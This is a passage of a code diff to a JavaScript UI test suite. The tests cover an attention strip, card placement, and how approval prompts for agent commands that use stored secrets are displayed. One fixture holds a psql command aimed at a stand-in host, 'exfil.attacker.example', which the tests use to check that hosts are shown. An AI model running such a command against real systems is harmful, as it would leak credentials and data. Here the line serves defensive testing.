@@ -1758,7 +1758,7 @@ console.log('㉗ THE ANNOUNCE (lane needs-card-tail r10 addendum; r11) — the b
   ok(/w\._waitWhy\.add\('ask'\);/.test(an) && /why\?\.delete\('ask'\);\n\s+if \(!why\?\.size && w\.element\.classList\.contains\('window-waiting'\)\)/.test(an) && /if \(!answered\) why\?\.clear\(\);/.test(an) && /\(this\.winInfo\._waitWhy \|\| \(this\.winInfo\._waitWhy = new Set\(\)\)\)\.add\('turn'\);/.test(CV) && /_clearWaiting\(\) \{\n\s+this\.winInfo\._waitWhy\?\.clear\(\);/.test(CV) && !/_annOwns/.test(P), 'RED-able (r11 — 7ec6c6dcf decided once whose blink it was): THE BLINK HAS REASONS — the announce adds \'ask\', a turn\'s end \'turn\'; an answer elsewhere drops \'ask\' only and the blink ends only when no reason is left; seeing the window acknowledges them all');
   ok(/annStack = mk\('div', 'ut-announce'\);\n\s+document\.body\.append\(annStack\);/.test(an) && !/createPopover\(|dataset\.popover|data-popover="/.test(an) && /\.ut-announce \{ position: fixed; z-index: \d+;/.test(ST) /* (its layer: ㉛, r13) */ && /\[data-popover\], \.ut-announce'\), \(el\) => el\.id === 'global-toasts'/.test(UT) && /if \(annCards\.has\(it\.id\)\) return; \/\/ one card per item/.test(an) && /jump\(live\.sessionKey, live\)/.test(an) && !/innerHTML = (?!UI_ICONS\.)/.test(an), 'RED-able (r11 — 7ec6c6dcf\'s stack was a createPopover: it took the first Esc, the phone\'s back press, the autohide taskbar): the card stack is a transient toast — no [data-popover]; the global toasts stand clear of it (_toastAvoid); one card per item, its press THE door (model.jump on the LIVE record), no peer string through innerHTML');
   ok(/annRefresh\(\); \/\/ the announce's cards and flashes follow the store/.test(ap) && /if \(!it \|\| \(it\.status !== 'open' && !late\) \|\| \(it\.status === 'open' && !annInPolicy\(it, now\)\)\) \{ annDrop\(id\); continue; \}/.test(an) && /const annInPolicy = \(it, now\) => toastWorthy\(attentionRow\(it, now\), attnPolicy\(\)\);/.test(an) && /todos\.open\.some\(\(i\) => i\.id === id && annInPolicy\(i, now\)\)/.test(an), 'every snapshot re-reads the cards: answered anywhere ⇒ gone; no longer inside the policy (a band switched off since) ⇒ gone, its flash with it; expired ⇒ said and kept a while (a late card)');
-  ok(/const order = \[\.\.\.annCards\.values\(\)\]\.sort\(\(x, y\) => newestFirst\(x\.key, y\.key\)\);/.test(an) && /const ANN_MS = 20000, ANN_SHOWN = 3;/.test(an) && /order\.forEach\(\(c, k\) => \{ c\.el\.hidden = k >= ANN_SHOWN; \}\);/.test(an), 'RED-able (r11 — 7ec6c6dcf ordered a same-ms tie by when the card was made): the stack shows the newest ANN_SHOWN (3) by newestFirst — a tie by id, the dock\'s order — and folds the rest into ONE «N more waiting»: a resync\'s burst is one stack, never a storm');
+  ok(/const order = \[\.\.\.annCards\.values\(\)\]\.filter\(\(c\) => !held \|\| c\.el\.parentNode === annStack\)\.sort\(\(x, y\) => newestFirst\(x\.key, y\.key\)\);/.test(an) /* r15: a held stack's arrivals wait (㉝) */ && /const ANN_MS = 20000, ANN_SHOWN = 3;/.test(an) && /order\.forEach\(\(c, k\) => \{ c\.el\.hidden = k >= ANN_SHOWN; \}\);/.test(an), 'RED-able (r11 — 7ec6c6dcf ordered a same-ms tie by when the card was made): the stack shows the newest ANN_SHOWN (3) by newestFirst — a tie by id, the dock\'s order — and folds the rest into ONE «N more waiting»: a resync\'s burst is one stack, never a storm');
   ok(/\.window-announce \.chat-attn-dock \.cad-count, \.chat-attn-dock\.cad-mark \.cad-count \{[^}]*background: var\(--yellow\);/.test(CC) && /\n  \.ut-announce :is\(button, \[role="button"\]\),\n/.test(ST) && !/\.uta-[\w-]+[^{]*\{[^}]*(#[0-9a-fA-F]{3,8}\b|rgba?\()/.test(ST), 'the strip\'s count wears the attention fill while an item is unseen (and while a landing marks it — r11); the stack\'s rules use theme vars only and JOIN the touch scale (44 px targets)');
 }
 
@@ -1916,7 +1916,7 @@ console.log('㉛ THE ANNOUNCE YIELDS TO THE OWNER\'S OWN ACT (lane needs-card-ta
   const formOver = asideRun([el(box(340, 120, 940, 700))]), farForm = asideRun([el(box(40, 60, 600, 400))]), hiddenDesk = asideRun([el(box(340, 120, 940, 700), false)]), none = asideRun([]);
   ok(formOver === 'hidden' && farForm === '' && hiddenDesk === '' && none === '', `RED-able (r13 — 3b8602717 has no step-aside): a form / dialog / menu where the stack stands ⇒ the stack steps aside («${formOver}»); one elsewhere («${farForm}»), on another desktop («${hiddenDesk}»), none («${none}») ⇒ it stands`, { formOver, farForm, hiddenDesk, none });
   const P2 = P.slice(P.indexOf('  const annPlace = () => {'), P.indexOf('  const annDrop = (id) =>')), P1 = P2.slice(0, P2.indexOf('  /** r13 (the .365 runner'));
-  ok(/\n    annAside\(\);\n  \};$/.test(P1.trimEnd()) && (P1.match(/annAside\(\); return;/g) || []).length === 1 && /matches\?\.\(':hover'\) && annAt\) \{ annAside\(\); return; \}/.test(P1) && /\$\{DIALOG_ROOTS\}, \[data-popover\], \.context-menu/.test(P2), 'the placement asks it on its one road (anchored, or centred with no For-you button — r14: one road; its one early return, a stack under the pointer held, asks it too) — every second while a card stands (annRefresh → annLayout → annPlace), over THE one dialog predicate (form-yield.js DIALOG_ROOTS)');
+  ok(/\n    annAside\(\);\n  \};$/.test(P1.trimEnd()) && !/annAside\(\); return;/.test(P1) && /if \(annHeld\(\)\) \{/.test(P1) && /\$\{DIALOG_ROOTS\}, \[data-popover\], \.context-menu/.test(P2), 'the placement asks it on its one road (anchored, or centred with no For-you button — r14: one road; r15: a stack a pointer holds rides it too, no early return — the clamp and the step-aside run held or not) — every second while a card stands (annRefresh → annLayout → annPlace), over THE one dialog predicate (form-yield.js DIALOG_ROOTS)');
   // ④ the layers: below the palette / a dialog's overlay / menus, popovers, the tray / the toasts — above every window
   const zOf = (sel) => { const m = CSS.match(new RegExp('(^|\\n)' + sel.replace(/[.#()-]/g, (c) => '\\' + c) + '\\s*\\{[^}]*?z-index:\\s*(\\d+)')); return m ? Number(m[2]) : NaN; };
   const za = zOf('.ut-announce'), above = { palette: zOf('.palette-overlay'), dialog: zOf('.dialog-overlay'), tray: zOf('.usage-popup'), toasts: Number((CSS.match(/#global-toasts \{[^}]*?z-index:\s*(\d+)/) || [])[1]),
@@ -1945,9 +1945,9 @@ console.log('㉜ THE ANNOUNCE STANDS CLEAR OF A WINDOW\'S OWN CONTROLS · IT JUD
     try {
       let nudged = 0;
       const st = { isConnected: true, style: {}, getBoundingClientRect: () => box(0, 0, 380, 200), contains: () => false, matches: (q) => q === ':hover' && hover }; // (read for its size: 380 × 200, three cards)
-      const S = { annStack: st, annAnchor: () => (anchor ? { getBoundingClientRect: () => anchor } : null), uiScale: () => 1, annAt: '',
+      const S = { annStack: st, annAnchor: () => (anchor ? { getBoundingClientRect: () => anchor } : null), uiScale: () => 1, annAt: '', annPin: hover ? { el: {}, top: 0 } : null,
         window: globalThis.window, document: doc, chromeAvoidRects: avoid, toastDeskSpot: U.toastDeskSpot, placeToastsSoon: () => { nudged++; }, annAside() {} };
-      const A = run(slice('  const annPlace = () => {', '  /** r13 (the .365 runner'), 'annPlace', S);
+      const A = run(slice('  const annHeld = () =>', '  /** r13 (the .365 runner') || slice('  const annPlace = () => {', '  /** r13 (the .365 runner'), 'annPlace', S); // (r15: annHeld rides the slice — a tree before it, its own annPlace)
       if (A.threw) return { threw: A.threw };
       const tops = [];
       for (let k = 0; k < passes; k++) { if (typeof passes === 'number' && k && S.between) S.between(); A.annPlace(); tops.push(parseFloat(st.style.top)); }
@@ -1976,11 +1976,13 @@ console.log('㉜ THE ANNOUNCE STANDS CLEAR OF A WINDOW\'S OWN CONTROLS · IT JUD
     globalThis.document = doc; globalThis.window = { innerWidth: 1280, innerHeight: 800 };
     try {
       const st = { isConnected: true, style: {}, getBoundingClientRect: () => box(0, 0, 380, 200), contains: () => false, matches: () => false };
-      const A = run(slice('  const annPlace = () => {', '  /** r13 (the .365 runner'), 'annPlace', { annStack: st, annAnchor: () => ({ getBoundingClientRect: () => BTN }), uiScale: () => 1, annAt: '',
-        window: globalThis.window, document: doc, chromeAvoidRects: U.chromeAvoidRects, toastDeskSpot: U.toastDeskSpot, placeToastsSoon: () => { nudged++; }, annAside() {} });
+      const S = { annStack: st, annAnchor: () => ({ getBoundingClientRect: () => BTN }), uiScale: () => 1, annAt: '', annPin: null,
+        window: globalThis.window, document: doc, chromeAvoidRects: U.chromeAvoidRects, toastDeskSpot: U.toastDeskSpot, placeToastsSoon: () => { nudged++; }, annAside() {} };
+      const A = run(slice('  const annHeld = () =>', '  /** r13 (the .365 runner') || slice('  const annPlace = () => {', '  /** r13 (the .365 runner'), 'annPlace', S); // (r15: annHeld rides the slice — a tree before it, its own annPlace)
       if (A.threw) return { threw: A.threw };
       A.annPlace(); const t1 = parseFloat(st.style.top);
-      els = els2; if (hover) st.matches = (q) => q === ':hover';
+      const l1 = parseFloat(st.style.left); st.getBoundingClientRect = () => box(l1, t1, l1 + 380, t1 + 200); // (where it stands now)
+      els = els2; if (hover) { st.matches = (q) => q === ':hover'; S.annPin = { el: {}, top: t1 }; } // (a mouse resting on it)
       A.annPlace(); return { t1, t2: parseFloat(st.style.top), nudged };
     } finally { globalThis.document = had.document; globalThis.window = had.window; }
   };
@@ -2116,5 +2118,159 @@ console.log('㉜ THE ANNOUNCE STANDS CLEAR OF A WINDOW\'S OWN CONTROLS · IT JUD
   ok(!bm.threw && bm.armed === 1 && !bm.stamped && !bm.press.ok && bm.press.code === 'just-moved', `CONTROL (r14): the mutant that arms on a new key only leaves the new Allow unstamped — a press 30 s later is «${bm.press.code}» (the acceptance's shape) — the leg goes red`, bm);
 }
 
+console.log('㉝ THE STRIP SAYS WHAT ITS ANSWERS DECIDE ON · A HELD STACK KEEPS THE READ CARD · THE CLOCK\'S LINE NEVER PAST THE EDGE (lane needs-card-tail r15 — the r14 acceptance: «Always … (these hosts)» in the strip with the hosts hidden; a card arriving under the pointer grew the stack downward; a late run\'s line ran past a 700 px window)');
+{
+  const { pathToFileURL } = await import('node:url'); const J = JSON.stringify;
+  const P = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-panel.js'), 'utf8'), CC = fs.readFileSync(path.join(ROOT, 'public/chat.css'), 'utf8'), ST = fs.readFileSync(path.join(ROOT, 'public/style.css'), 'utf8');
+  const CARD = fs.readFileSync(path.join(ROOT, 'src/lib/chat-needs-card.js'), 'utf8'), ZH = fs.readFileSync(path.join(ROOT, 'src/lib/i18n-zh.js'), 'utf8'), JA = fs.readFileSync(path.join(ROOT, 'src/lib/i18n-ja.js'), 'utf8');
+  const slice = (a, b, src = P) => { const i = src.indexOf(a), j = src.indexOf(b, i); return i >= 0 && j > i ? src.slice(i, j) : null; };
+  const run = (src, names, S) => { try { if (src == null) throw new Error('slice not found'); return new Function('scope', `with (scope) { ${src} return { ${names} }; }`)(new Proxy(S, { has: (o, k) => k in o })); } catch (e) { return { threw: String(e) }; } };
+  const box = (l, t, r, b) => ({ left: l, top: t, right: r, bottom: b, width: r - l, height: b - t });
+  // A — THE STRIP'S RUN CARD: the REAL renderRow with the strip's ctx (noPick — user-todos-panel dockCtx) over the run card's
+  // fixtures; what the strip SHOWS is read off the strip's own grammar in chat.css (the run card's children it does not hide) —
+  // the command head is one ellipsized line, so a host inside it is no host shown
+  const hideList = (css) => { const m = css.match(/\.cad-rows \.ut-run > :not\(([^)]*)\) \{ display: none !important; \}/); return m ? m[1].split(',').map((x) => x.trim().replace(/^\./, '')) : []; };
+  const kidsOf = (html) => { // the top-level children of the row's .ut-run (a tag-depth walk over the renderer's markup)
+    const i = html.indexOf('<div class="ut-run">'); if (i < 0) return [];
+    const re = /<(\/?)([a-z0-9]+)([^>]*)>/g; re.lastIndex = i; let depth = 0, cur = null, m; const out = [];
+    while ((m = re.exec(html))) {
+      if (!m[1]) { depth++; if (depth === 2) cur = { cls: ((m[3].match(/class="([^"]*)"/) || [])[1] || '').split(' '), start: m.index }; if (/^(br|img|input|hr)$/.test(m[2])) depth--; }
+      else { if (depth === 2 && cur) { out.push({ ...cur, html: html.slice(cur.start, re.lastIndex) }); cur = null; } if (--depth === 0) break; }
+    }
+    return out;
+  };
+  const stripSees = (html, css) => { const shown = hideList(css), kids = kidsOf(html).filter((k) => k.cls.some((c) => shown.includes(c)));
+    const facts = kids.filter((k) => !k.cls.includes('ut-run-cmd') && !k.cls.includes('ut-exit-answer')).map((k) => k.html.replace(/<[^>]+>/g, '')).join(' ');
+    return { facts, answers: [...kids.map((k) => k.html).join('').matchAll(/data-answer="(\w+)"/g)].map((x) => x[1]), warn: kids.some((k) => /ut-run-warn/.test(k.html) && !k.cls.includes('ut-run-cmd')), kids: kids.map((k) => k.cls[0]) }; };
+  const FXV = JSON.parse(fs.readFileSync(path.join(ROOT, 'scripts/fixtures/vault-run-card-facts.json'), 'utf8')).variants, base = FXV.find((v) => v.name === 'hosts-known-always').facts;
+  const T0 = Date.now();
+  const runAsk = (id, facts, action = {}) => ({ item: { id, sessionKey: 'claude:ops', status: 'open', kind: 'action', origin: 'vault', by: 'agent', urgency: 'urgent', text: 'ops wants to run a command with a stored secret', detail: 'Program: psql', createdAt: T0 - 5e3, expiresAt: T0 + 55e3, action: { type: 'vault-run-ask', askId: 'e'.repeat(32), always: true, tool: 'x', ...action }, facts } });
+  const longCmd = 'psql ' + Array.from({ length: 10 }, (_, k) => `-v col${k}=some_long_value_${k}`).join(' ') + ' -h exfil.attacker.example -U svc -c "select 1"';
+  const asks = {
+    past: runAsk('ut-r15past', { ...base, cmd: longCmd, hosts: { known: true, list: ['exfil.attacker.example'] } }),
+    writable: runAsk('ut-r15wr', { ...base, tool: { ...base.tool, path: '~/workspace/ops/bin/psql', writable: true }, always: { offered: false, why: 'program-writable', directive: null } }, { always: false }),
+    again: runAsk('ut-r15again', { ...base, whyAgain: { code: 'args' } }),
+    cut: runAsk('ut-r15cut', { ...base, cmd: 'psql ' + 'x'.repeat(1995) + '…', cmdCut: true, cmdFull: ['psql ' + 'x'.repeat(2400)] }),
+    many: runAsk('ut-r15many', { ...base, hosts: { known: true, list: Array.from({ length: 12 }, (_, k) => `replica-${k}.db.internal.example`) } }),
+  };
+  const noop = () => {};
+  const mkEl = () => { let html = ''; return { dataset: {}, className: '', get innerHTML() { return html; }, set innerHTML(v) { html = v; }, querySelector: () => null, querySelectorAll: () => [], appendChild: noop, addEventListener: noop, setAttribute: noop, classList: { add: noop, remove: noop, toggle: noop, contains: () => false }, style: {} }; };
+  const hadE = { window: globalThis.window, document: globalThis.document, localStorage: globalThis.localStorage, addEventListener: globalThis.addEventListener };
+  globalThis.window = globalThis; globalThis.addEventListener = globalThis.addEventListener || noop; globalThis.removeEventListener = globalThis.removeEventListener || noop;
+  globalThis.localStorage = { getItem: () => null, setItem: noop, removeItem: noop };
+  globalThis.document = { createElement: mkEl, querySelector: () => null, querySelectorAll: () => [], getElementById: () => null, addEventListener: noop, removeEventListener: noop, documentElement: { style: {}, lang: 'en' }, body: mkEl(), head: mkEl() };
+  try {
+    const { mutantCopies } = await import(path.join(ROOT, 'scripts/mutant-copy.mjs'));
+    const REL = 'src/lib/user-todos-row.js', src = fs.readFileSync(path.join(ROOT, REL), 'utf8');
+    const ctx = { t: (x, p) => (p ? x.replace(/\{(\w+)\}/g, (m, k) => (p[k] !== undefined ? String(p[k]) : m)) : x), wordsOf: (i) => i.text, detailOf: () => '', nameFor: () => 'S', replyState: () => ({ show: false }), mini: true, noPick: true };
+    const seeAll = (R, css = CC) => Object.fromEntries(Object.entries(asks).map(([k, a]) => [k, stripSees(R.renderRow(a, ctx).innerHTML, css)]));
+    const R = await import(pathToFileURL(path.join(ROOT, REL)).href);
+    const g = seeAll(R);
+    const hostSaid = (v, h) => v.facts.includes(h);
+    ok(hostSaid(g.past, 'exfil.attacker.example') && g.past.answers.join() === 'once,always,deny' && /Sends to/.test(g.past.facts),
+      `RED-able (r15 — 2353267f1: the strip offered «Always let this conversation use it (these hosts)» with the hosts hidden — the host only past the command's ellipsis): a run ask whose host lies past the ellipsis ⇒ the strip SAYS its hosts («${g.past.facts.slice(0, 60)}») beside its answers (${J(g.past.answers)}) — or offers no Always`, g.past);
+    ok(g.writable.warn && /in a folder an agent can write/.test(g.writable.facts) && !g.writable.answers.includes('always'),
+      `RED-able (r15 — 2353267f1 hid the warning row): a program an agent can write ⇒ its warning row in the strip, in the card's accent («${(g.writable.facts.match(/Program[^]*?write\)/) || [''])[0]}»), beside Allow once / Deny (${J(g.writable.answers)})`, g.writable);
+    ok(/Asked again — it differs from the command you let through: its arguments changed/.test(g.again.facts) && g.again.answers.includes('always'),
+      `RED-able (r15 — 2353267f1 hid the «asked again» line): a near-identical rerun ⇒ the strip says the one way it differs before its Always («${(g.again.facts.match(/Asked again[^]*?changed/) || [''])[0]}»)`, g.again);
+    ok(/The command is cut — its card holds the whole/.test(g.cut.facts), `RED-able (r15 — 2353267f1 hid the cut line): a command the card cuts ⇒ the strip says it is cut («The command is cut — its card holds the whole»)`, g.cut);
+    ok(!g.many.answers.includes('always') && g.many.answers.join() === 'once,deny' && /what it decides on, and «Always», are on its card/.test(g.many.facts) && !g.many.facts.includes('replica-0'),
+      `RED-able (r15): facts too long for a strip (twelve hosts) ⇒ none of them, the line that says where they are («${g.many.facts.trim().slice(0, 80)}»), and only the answers that need none (${J(g.many.answers)}) — never an «Always» beside hosts it does not show`, g.many);
+    const wNone = R.stripWithholds?.(asks.many.item, ctx.t) ?? null, wPast = R.stripWithholds?.(asks.past.item, ctx.t) ?? null; // (2353267f1 has none: null)
+    const toastPick = /showToast\(stripWithholds\(item\)\.length \? t\('Asked before this conversation\\'s record was kept — there is no card for it in the chat; the strip above the message box offers Allow once and Deny — «Always» and what it decides on are on its card in For you'\) : t\('Asked before this conversation\\'s record was kept — there is no card for it in the chat; answer it in the strip above the message box or in For you'\)/.test(CARD);
+    const keyed = ['The command is cut — its card holds the whole', 'Too long to show here — what it decides on is on its card', 'Too long to show here — what it decides on, and «Always», are on its card', "Asked before this conversation's record was kept — there is no card for it in the chat; the strip above the message box offers Allow once and Deny — «Always» and what it decides on are on its card in For you"].every((k) => ZH.includes(J(k) + ':') && JA.includes(J(k) + ':'));
+    ok(J(wNone) === '["always"]' && J(wPast) === '[]' && toastPick && keyed, `the landing's toast says what the strip offers — the strip that withholds «Always» (${J(wNone)}) is named «offers Allow once and Deny — «Always» … on its card in For you»; one that offers all (${J(wPast)}) keeps «answer it in the strip»; every new word in zh and ja`, { wNone, wPast, toastPick, keyed });
+    // the controls: a renderer that offers «Always» whatever fits; a strip grammar that hides the facts again
+    const mut = src.replace("answers = held.filter((a) => a !== 'always' || s.fits);", 'answers = held;');
+    const Rm = await import(pathToFileURL(mutantCopies('utrow15', ROOT).write(REL, mut, 'stripall')).href);
+    const gm = seeAll(Rm), gc = seeAll(R, CC.replace(':not(.ut-run-cmd, .ut-run-gist, .ut-run-answer)', ':not(.ut-run-cmd, .ut-run-answer)'));
+    ok(mut !== src && gm.many.answers.includes('always') && !gm.many.facts.includes('replica-0'), `CONTROL (r15): the mutant that offers «Always» whatever fits puts it beside twelve hosts it does not show (${J(gm.many.answers)}) — the leg goes red`, gm.many);
+    ok(!hostSaid(gc.past, 'exfil.attacker.example') && !gc.writable.warn && !/Asked again/.test(gc.again.facts), 'CONTROL (r15): the strip grammar of 2353267f1 (the facts hidden) shows no host, no warning row, no «asked again» — the legs go red', { past: gc.past, writable: gc.writable, again: gc.again });
+  } catch (e) { ok(false, '㉝ A: the row renderer runs under the minimal DOM', e.stack); }
+  finally { for (const [k, v] of Object.entries(hadE)) { if (v === undefined) delete globalThis[k]; else globalThis[k] = v; } }
+  // B — A HELD STACK KEEPS THE READ CARD: the REAL annPlace + annLayout (sliced) over a stack laid out like style.css's (a column,
+  // 66 px cards, 6 px gap, the «N more» row) at the For-you button's place; a mouse resting on a card (annPin, what the stack's
+  // pointerover writes) — the acceptance's probe: one card at 688–754 over the button at 760, the pointer on it, a second arrives
+  const FA = await import(pathToFileURL(path.join(ROOT, 'src/foryou-actions.js')).href), U = await import(pathToFileURL(path.join(ROOT, 'src/lib/utils.js')).href);
+  const PLACE = slice('  const annHeld = () =>', '  /** r13 (the .365 runner') || slice('  const annPlace = () => {', '  /** r13 (the .365 runner'); // (2353267f1 has no annHeld — its annPlace, so its red is the behaviour)
+  const LAYOUT = slice('  const annLayout = () => {', '  const annPaint = ');
+  const hold = ({ vh = 800 } = {}) => {
+    const H = 66, G = 6, MH = 26, had = { document: globalThis.document, window: globalThis.window };
+    const cards = [], more = { cls: 'more', hidden: true, textContent: '', parentNode: null };
+    const st = { isConnected: true, style: {}, hover: false, remove() { this.isConnected = false; } };
+    more.parentNode = st;
+    const shown = () => [...cards.filter((c) => !c.hidden), ...(more.hidden ? [] : [more])];
+    const yOf = (e) => { let y = parseFloat(st.style.top || '0'); for (const x of shown()) { if (x === e) return y; y += (x === more ? MH : H) + G; } return NaN; };
+    st.getBoundingClientRect = () => { const n = shown(), t = parseFloat(st.style.top || '0'), h = n.reduce((a, e, k) => a + (e === more ? MH : H) + (k ? G : 0), 0), l = parseFloat(st.style.left || '0'); return box(l, t, l + 380, t + h); };
+    st.querySelector = (q) => (/uta-more/.test(q) ? more : null); st.querySelectorAll = () => [...cards];
+    st.insertBefore = (el) => { const k = cards.indexOf(el); if (k >= 0) cards.splice(k, 1); cards.push(el); el.parentNode = st; };
+    st.contains = (e) => e === st || cards.includes(e) || e === more; st.matches = (q) => q === ':hover' && st.hover;
+    const card = (id, at) => { const el = { id, hidden: false, parentNode: null }; el.getBoundingClientRect = () => { const y = yOf(el); return box(0, y, 380, y + H); }; return { el, key: { id, createdAt: at }, until: Date.now() + 20000, expiredAt: 0 }; };
+    const annCards = new Map();
+    const S = { annStack: st, annCards, annAnchor: () => ({ getBoundingClientRect: () => box(1200, 760, 1240, 796) }), uiScale: () => 1, annAt: '', annPin: null, annTimer: 0, ANN_SHOWN: 3, ANN_MS: 20000,
+      window: { innerWidth: 1280, innerHeight: vh }, document: { querySelectorAll: () => [], getElementById: () => null }, chromeAvoidRects: () => [], toastDeskSpot: U.toastDeskSpot, placeToastsSoon() {}, annAside() {}, annWatch() {},
+      newestFirst: FA.newestFirst, t: (k, p) => k.replace('{n}', p ? p.n : ''), clearInterval() {} };
+    const A = run((PLACE || '') + (LAYOUT || ''), 'annPlace, annLayout', S);
+    const add = (id, at) => { const c = card(id, at); annCards.set(id, c); return c; };
+    const drop = (id) => { const c = annCards.get(id); const k = cards.indexOf(c.el); if (k >= 0) cards.splice(k, 1); c.el.parentNode = null; annCards.delete(id); };
+    const rest = (c) => { st.hover = true; S.annPin = { el: c.el, top: c.el.getBoundingClientRect().top }; };
+    const leave = () => { st.hover = false; S.annPin = null; };
+    const span = (c) => (c.el.parentNode === st && !c.el.hidden ? [c.el.getBoundingClientRect().top, c.el.getBoundingClientRect().bottom] : null);
+    return { A, S, st, add, drop, rest, leave, span, bottom: () => st.getBoundingClientRect().bottom, top: () => st.getBoundingClientRect().top, setVh: (v) => { S.window.innerHeight = v; } };
+  };
+  const growth = (() => { const h = hold(); if (h.A.threw) return { threw: h.A.threw }; const a = h.add('A', 1000); h.A.annLayout(); const before = h.span(a); h.rest(a); const b = h.add('B', 2000); h.A.annLayout();
+    const held = { a: h.span(a), b: h.span(b), bottom: h.bottom() }; h.leave(); h.A.annLayout(); return { before, held, after: { a: h.span(a), b: h.span(b), bottom: h.bottom() } }; })();
+  const gone = (() => { const h = hold(); if (h.A.threw) return { threw: h.A.threw }; const c3 = [h.add('A', 1000), h.add('B', 2000), h.add('C', 3000)]; h.A.annLayout(); const before = h.span(c3[0]); h.rest(c3[0]); h.drop('C'); h.A.annLayout(); return { before, held: h.span(c3[0]), bottom: h.bottom() }; })();
+  const fourth = (() => { const h = hold(); if (h.A.threw) return { threw: h.A.threw }; const c3 = [h.add('A', 1000), h.add('B', 2000), h.add('C', 3000)]; h.A.annLayout(); const before = h.span(c3[0]); h.rest(c3[0]); h.add('D', 4000); h.A.annLayout(); return { before, held: h.span(c3[0]), bottom: h.bottom() }; })();
+  const shrink = (() => { const h = hold(); if (h.A.threw) return { threw: h.A.threw }; const a = h.add('A', 1000); h.A.annLayout(); h.rest(a); h.setVh(700); h.A.annPlace(); return { span: h.span(a), bottom: h.bottom(), top: h.top() }; })();
+  const same = (x, y) => !!x && !!y && x[0] === y[0] && x[1] === y[1];
+  ok(!growth.threw && same(growth.before, [688, 754]) && same(growth.held.a, [688, 754]) && growth.held.bottom <= 796 && same(growth.after.a, [688, 754]) && !!growth.after.b && growth.after.b[1] <= 688,
+    `RED-able (r15 — 2353267f1: the hold returned before the placement, the new card took the top and pushed the read one to 760–826 past an 800 px viewport): the acceptance's probe — the pointer on the card at ${J(growth.before)}, a card arrives ⇒ the read card stays at ${J(growth.held && growth.held.a)} (the new one waits — the stack's bottom ${growth.held && growth.held.bottom}); the pointer leaves ⇒ the new card above it (${J(growth.after && growth.after.b)}), the read one still ${J(growth.after && growth.after.a)}`, growth);
+  ok(!gone.threw && same(gone.before, [688, 754]) && same(gone.held, [688, 754]) && gone.bottom <= 796,
+    `RED-able (r15 — 2353267f1 kept the stack's top: a card above the read one answered elsewhere slid it up from under the pointer): three cards, the pointer on the lowest (${J(gone.before)}), the top one gone ⇒ the read card stays (${J(gone.held)})`, gone);
+  ok(!fourth.threw && same(fourth.held, [688, 754]),
+    `r15: three cards shown, the pointer on the third (${J(fourth.before)}), a fourth arrives ⇒ the read card stays shown where it was (${J(fourth.held)}) — it is never folded into «N more» under the pointer`, fourth);
+  ok(!shrink.threw && shrink.bottom <= 700 - 4 && shrink.top >= 4,
+    `RED-able (r15 — 2353267f1's hold skipped the clamp): a held stack whose viewport shrinks to 700 ⇒ the clamp runs held or not — the stack ${shrink.top}–${shrink.bottom}, nothing off the screen`, shrink);
+  const withSrc = (srcAll, scenario) => { const h = hold(); const A2 = run(srcAll, 'annPlace, annLayout', h.S); if (A2.threw) return { threw: A2.threw }; h.A.annPlace = A2.annPlace; h.A.annLayout = A2.annLayout; return scenario(h); };
+  const fourthOf = (h) => { const c3 = [h.add('A', 1000), h.add('B', 2000), h.add('C', 3000)]; h.A.annLayout(); h.rest(c3[0]); h.add('D', 4000); h.A.annLayout(); return { held: h.span(c3[0]) }; };
+  const goneOf = (h) => { const c3 = [h.add('A', 1000), h.add('B', 2000), h.add('C', 3000)]; h.A.annLayout(); h.rest(c3[0]); h.drop('C'); h.A.annLayout(); return { held: h.span(c3[0]) }; };
+  const shrinkOf = (h) => { const a = h.add('A', 1000); h.A.annLayout(); h.rest(a); h.setVh(700); h.A.annPlace(); return { bottom: h.bottom() }; };
+  const all = (PLACE || '') + (LAYOUT || '');
+  const mq = all.replace('.filter((c) => !held || c.el.parentNode === annStack)', ''), mp = all.replace('top = pr.top + (el ? annPin.top - el.getBoundingClientRect().top : 0);', 'top = pr.top;'), mc = all.replace("top = Math.max(4, Math.min(vh - pr.height - 4, top)); left = Math.max(4, Math.min(vw - pr.width - 4, left)); // THE CLAMP", '// THE CLAMP');
+  const rq = withSrc(mq, fourthOf), rp = withSrc(mp, goneOf), rc = withSrc(mc, shrinkOf);
+  ok(mq !== all && mp !== all && mc !== all && !same(rq.held, [688, 754]) && !same(rp.held, [688, 754]) && rc.bottom > 696,
+    `CONTROL (r15): the mutant that lets a card in under a held stack folds the read one away (${J(rq.held)}); the one without the pin lets it slide (${J(rp.held)}); the one without the clamp leaves the stack past the viewport (bottom ${rc.bottom}) — the legs go red`, { rq, rp, rc });
+  // C — THE CLOCK'S LINE: the strip's deadline rule in chat.css, at every width (no container query) — it wraps inside a line of
+  // its own or ellipsizes; r14's `flex: none; white-space: nowrap` ran a late run's 615 px sentence past a 700 px window
+  const dlRule = (css) => { const flat = css.replace(/@container[^{]*\{[\s\S]*?\n\}/g, ''); const m = flat.match(/\n\.cad-rows \.ut-body > \.ut-deadline \{([^}]*)\}/); return m ? m[1] : null; };
+  const fits = (r) => { if (!r) return false; const v = (k) => (r.match(new RegExp('(?:^|;)\\s*' + k + ':\\s*([^;]+)')) || [])[1]?.trim();
+    const flex = v('flex') || '', shrink = flex === 'none' ? 0 : Number((flex.split(/\s+/)[1]) ?? 1), basis100 = /\s100%$/.test(flex), min0 = v('min-width') === '0' || basis100;
+    const wraps = v('white-space') !== 'nowrap' && shrink >= 1 && min0, ell = v('overflow') === 'hidden' && v('text-overflow') === 'ellipsis' && shrink >= 1 && min0;
+    return wraps || ell; };
+  const r15 = dlRule(CC), r14 = 'order: 2; flex: none; margin: 0; font-size: 11px; line-height: 16px; white-space: nowrap;';
+  ok(fits(r15) && /\.chat-attn-dock \.cad-rows \.ut-body > \.ut-deadline \{ flex: 1 1 100%; white-space: normal;/.test(ST),
+    `RED-able (r15 — 2353267f1: «${r14}» outside the ≤ 520 px query — a late run's sentence past a 700 px window's edge): the strip's clock line can shrink to its line and wraps there at every width («${(r15 || '').trim()}»); the phone's is a whole line of its own`, { r15 });
+  ok(!fits(r14), 'CONTROL (r15): 2353267f1\'s rule (`flex: none; white-space: nowrap`) neither wraps nor ellipsizes — the leg goes red');
+  // D — A STRIP THAT CHANGES SIZE SAYS SO (r15 — its own 700 px shot: a late run's strip grew under a stack placed a moment
+  // before, the card on the strip's clock line until the next 1 s tick): the REAL _dockPass over stubs — the strip grew, kept
+  // its size, went ⇒ foryouRows.chromeMoved (the stack and the toasts re-placed at once) once, never, once
+  const dps = slice('  _dockPass(waiting) {', '  /** The strip\'s parts, built once a view', CARD), body = (x) => (x ? x.slice(x.indexOf('{') + 1, x.lastIndexOf('}')) : null);
+  const sized = (src, steps) => {
